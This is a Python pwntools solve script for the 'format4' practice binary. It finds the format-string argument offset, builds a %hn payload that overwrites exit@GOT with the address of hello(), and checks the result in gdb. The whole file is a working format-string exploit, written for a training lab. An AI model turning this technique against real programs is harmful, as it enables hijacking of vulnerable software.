#!/usr/bin/env python3

from __future__ import annotations

import sys
from pathlib import Path

import subprocess

from pwn import ELF, log, p32, process

sys.path.append(str(Path(__file__).resolve().parents[1]))
from pwn_solve import set_pwn_context  # noqa: E402

SUCCESS = b"code execution redirected! you win"

def find_idx_pair(prog: str, addr1: int, addr2: int) -> int | None:
    """
    We place two pointers at the start of the buffer: addr1, addr2.
    Find an idx such that:
      %idx$08x   prints addr1
      %idx+1$08x prints addr2
    """
    n1 = f"{addr1:08x}".encode()
    n2 = f"{addr2:08x}".encode()
    for idx in range(1, 120):
        probe = p32(addr1) + p32(addr2) + (f".%{idx}$08x.%{idx+1}$08x.").encode() + b"\n"
        io = process([prog])
        io.send(probe)
        io.shutdown("send")
        out = io.recvall(timeout=2)
        if (n1 in out) and (n2 in out):
            return idx
    return None


def build_payload(exit_got: int, hello: int, idx: int) -> bytes:
    # Write lower halfword first, then upper.
    lo = hello & 0xFFFF
    hi = (hello >> 16) & 0xFFFF
    addrs = p32(exit_got) + p32(exit_got + 2)
    k1 = idx
    k2 = idx + 1

    count = len(addrs)
    pad1 = (lo - count) % 0x10000
    if pad1 == 0:
        pad1 = 0x10000
    count += pad1
    pad2 = (hi - count) % 0x10000
    if pad2 == 0:
        pad2 = 0x10000

    return addrs + (f"%{pad1}c%{k1}$hn%{pad2}c%{k2}$hn").encode() + b"\n"


def gdb_verify_overwrite(payload: bytes, hello: int, exit_got: int) -> bool:
    """
    Corelan-style validation: don't rely on stdout (hello() uses _exit()).
    Instead, confirm `exit@GOT == hello` at the breakpoint right before exit(1).
    """
    prog = str(Path(__file__).resolve().with_name("format4"))
    hv = "0x{0:08x}".format(hello & 0xFFFFFFFF)

    cp = subprocess.run(
        [
            "gdb",
            "-q",
            "-nx",
            "-batch",
            prog,
            "-ex",
            "break *0x8048551",
            "-ex",
            "run",
            "-ex",
            "x/wx 0x{0:08x}".format(exit_got & 0xFFFFFFFF),
            "-ex",
            "quit",
        ],
        input=payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out = cp.stdout.decode("latin-1", "replace")
    # Be permissive: just require the expected hello address appears in the memory dump.
    return hv in out

def main() -> int:
    set_pwn_context()

    # Binary is expected to be prebuilt (inside liveoverflow-pwn) and shared via volume.
    prog = str(Path(__file__).resolve().with_name("format4"))
    elf = ELF(prog)
    hello = elf.symbols.get("hello")
    if not hello:
        log.failure("hello() not found")
        return 2
    exit_got = elf.got.get("exit")
    if not exit_got:
        log.failure("exit@GOT not found")
        return 2

    # We need the idx for the pair (exit@got, exit@got+2), not just one of them.
    idx = find_idx_pair(prog, exit_got, exit_got + 2)
    if idx is None:
        log.failure("format4 failed to locate idx")
        return 2
    payload = build_payload(exit_got, hello, idx)
    io = process([prog])
    io.send(payload)
    io.shutdown("send")
    # Let the vulnerable program run to completion (it prints lots of padding).
    try:
        io.wait_for_close(timeout=8)
    except Exception:
        pass

    if gdb_verify_overwrite(payload, hello, exit_got):
        log.success("format4 solved (idx=%d) [verified via GOT]", idx)
        return 0
    log.failure("format4 failed (idx=%d) [GOT not overwritten]", idx)
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
